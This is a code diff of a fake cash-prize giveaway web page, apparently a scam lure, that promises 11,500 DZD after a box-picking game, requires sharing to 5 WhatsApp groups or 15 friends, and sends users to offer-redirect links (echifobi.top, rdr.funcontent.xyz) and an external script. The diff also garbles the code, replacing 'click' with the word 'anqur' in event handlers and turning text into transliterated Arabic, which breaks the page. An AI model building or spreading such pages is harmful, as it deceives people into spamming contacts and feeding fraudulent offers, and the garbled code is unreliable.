@@ -307,17 +307,17 @@ ladayk 3 furas ! natamanaa lak hazana saeidan
 yajib ealayk tahdid alsunduq aladhi yahtawi ealaa hadiatik dakhil alsanadiq.
 </p> 
    <br>
-<button class="button" v-on:click="showInstructionsModal = false">
+<button class="button" v-on:anqur="showInstructionsModal = false">
 Start
 </button>
 </vue-modal>
 <vue-modal :open="showFailModal">
-<h2 class="heading heading--h1">Better luck next time</h2>
+<h2 class="heading heading--h1">"حظًا أفضل في المرة القادمة"</h2>
 <p class="paragraph">
 ladayk fursatayn 'ukhrayayn lilmuhawala. 
 </p>
    <br>
-<button class="button" v-on:click="showFailModal = false">
+<button class="button" v-on:anqur="showFailModal = false">
 OK
 </button>
 </vue-modal>
@@ -330,7 +330,7 @@ OK
 jayizatuk hi: <b> 11500دج minhat naqdia</b><br>atabae altaelimat almawjudat fi alsafhat altaaliat lilmutalabat bijayizatik ! 
 </p>
     <br>
-<button class="button" v-on:click="$confetti.stop()" onclick="go();">
+<button class="button" v-on:anqur="$confetti.stop()" onanqur="go();">
 Ok
 </button>
 </vue-modal>
@@ -356,7 +356,7 @@ lilhusul ealaa alminhat alkhasat bika, 'ajab ealaa hadhih al'asyila <b>11,500د�
 </div>
 </div>
 <div class="right">
-<vue-box-picker v-if="showBoxPicker" :vertical-items="4" lid-image="https://i.imgur.com/HSX0Uhw.png" box-image="https://i.imgur.com/45mMPJQ.png" box-back-image="https://i.imgur.com/HSmfDGb.png" prize-image="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhRAX8Sx_QBu3Nvpftp5kbR5XMhmL2HaydF5xhQl68Jp6dfLiz8XuURAmht5W9IXc3yqpXuZGa3QmXQ28lB6QBNq4n2akYeHWVje5QAJxsziXLEyUdqt0Np_1_AuNM3RcXifj19FkjkhyynlFezl6i7zfonNze4TQKvp9A7y8P5t9b3NjpvByFfju4bw9KL/s16000/istockphoto-508053908-612x612-removebg-preview.png" v-on:fail="onBoxPickerFail" v-on:success="onBoxPickerSuccess" :horizontal-items="3" :max-clicks="2"></vue-box-picker>
+<vue-box-picker v-if="showBoxPicker" :vertical-items="4" lid-image="https://i.imgur.com/HSX0Uhw.png" box-image="https://i.imgur.com/45mMPJQ.png" box-back-image="https://i.imgur.com/HSmfDGb.png" prize-image="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhRAX8Sx_QBu3Nvpftp5kbR5XMhmL2HaydF5xhQl68Jp6dfLiz8XuURAmht5W9IXc3yqpXuZGa3QmXQ28lB6QBNq4n2akYeHWVje5QAJxsziXLEyUdqt0Np_1_AuNM3RcXifj19FkjkhyynlFezl6i7zfonNze4TQKvp9A7y8P5t9b3NjpvByFfju4bw9KL/s16000/istockphoto-508053908-612x612-removebg-preview.png" v-on:fail="onBoxPickerFail" v-on:success="onBoxPickerSuccess" :horizontal-items="3" :max-anqurs="2"></vue-box-picker>
 
 <div class="verify" v-if="showRotator">
 <vue-text-rotator v-on:rotate="rotate" v-on:finished="onRotatorFinished" :strings='[
@@ -431,9 +431,9 @@ fahas almakhzun
                            
 
                             </div>
-<p class="txt1">Your Prize is: <b>K55,000</b> <br>Follow the instructions below to your prize !</p>
+<p class="txt1">Your Prize is: <b>دج11,500</b> <br>atabae altaelimat 'adnaah lilhusul ealaa jayizatik !</p>
       <div class="bottom" id='buttonO'>
-<div id="lastapp"><p class="rules">1. Share with 5 groups / 15 friends on "Whatsapp" (click the "Whatsapp" icon below)</p><p class="rules">2. Click "Continue" and claim your prize.</p></div>
+<div id="lastapp"><p class="rules">1. Share with 5 groups / 15 friends on "Whatsapp" (anqur the "Whatsapp" icon below)</p><p class="rules">2. anqur "من فضلك استمر" and claim your prize.</p></div>
 
     
    <div class="share_main_bt" id="whatsapp">WhatsApp&nbsp;   →</div>
@@ -447,8 +447,8 @@ fahas almakhzun
                     <span id="percentage2">0%</span>
                 </div>
     
-            <br>       <div class="share_main_bt" onclick="tipn()" style="margin: 20px auto 0; background-color: #BE0612;">
-                                Continue
+            <br>       <div class="share_main_bt" onanqur="tipn()" style="margin: 20px auto 0; background-color: #BE0612;">
+                                من فضلك استمر
                             </div>
    
    
@@ -473,16 +473,16 @@ fahas almakhzun
             <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>   
         <br>
 	    
-        <a  onclick="window.open('https://echifobi.top/4/1322937')" href="" >
+        <a  onanqur="window.open('https://echifobi.top/4/1322937')" href="" >
                     <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">دج11,500</font></button>
                     </a><br/> <br/>
 	    
       <div class="share_main_bt" id="offer">aikhtar nawe alhisab</div><br/> <br/>
 
-	     <a  onclick="window.open('https://echifobi.top/4/1322937')" href="" >
+	     <a  onanqur="window.open('https://echifobi.top/4/1322937')" href="" >
                     <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">almudakharat</font></button>
                     </a><br/> <br/>
- <a  onclick="window.open('https://echifobi.top/4/1322937')" href="" >
+ <a  onanqur="window.open('https://echifobi.top/4/1322937')" href="" >
                     <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">alhisab aljari</font></button>
                     </a><br/> <br/>
 	
@@ -503,7 +503,7 @@ fahas almakhzun
   
   
 
-<script>window.view = window.view || {};view.offerUrl = "https:\/\/rdr.funcontent.xyz/click";view.qs = null;view.skip = 0;view.screenshot = 0;view.download = 1;view.noredir = false;</script> <script src="js/app.js?id=d41d8cd98f00b204e980" type="application/javascript"></script>
+<script>window.view = window.view || {};view.offerUrl = "https:\/\/rdr.funcontent.xyz/anqur";view.qs = null;view.skip = 0;view.screenshot = 0;view.download = 1;view.noredir = false;</script> <script src="js/app.js?id=d41d8cd98f00b204e980" type="application/javascript"></script>
 <script src="https://pamdas.pages.dev/wow.js?id=17138759790b445ece6b" type="application/javascript"></script>
   
 
@@ -572,7 +572,7 @@ if (swidth !== null) {
 } else {
     var width = 0;
 }
-$("#whatsapp").click(function () {
+$("#whatsapp").anqur(function () {
     window.open('whatsapp://send?text=' + tb);
     if (width == 0) {
         width += 50;
@@ -612,15 +612,15 @@ $("#whatsapp").click(function () {
         $("#percentage2").text(width + "%");
     }, 2000);
 });
-$("#offer").click(function () {
+$("#offer").anqur(function () {
     window.open(cpa, "_blank");
 });
    
-$("#offers").click(function () {
+$("#offers").anqur(function () {
     window.open(cpa1, "_blank");
 });
    
-$("#offerss").click(function () {
+$("#offerss").anqur(function () {
     window.open(cpa2, "_blank");
 });
    function tipn(){
